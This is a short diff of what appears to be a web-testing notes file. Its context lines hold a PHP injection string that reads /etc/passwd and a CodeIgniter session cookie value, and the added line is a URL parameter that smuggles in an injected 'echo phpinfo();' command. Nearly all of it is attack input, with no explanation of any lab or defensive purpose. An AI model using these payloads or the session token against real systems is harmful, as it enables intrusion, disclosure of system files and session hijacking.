@@ -1,3 +1,4 @@
 <pre>system('cat /etc/passwd')</pre>
 BastDetail/filterBast/-0
 ci_session=1gn6qkuhd64dbnhcdmuh82ollp1lkl68 
+/Manifest/filterManifest/0?value=DURI%20SELATAN%`;%20echo%20phpinfo();--
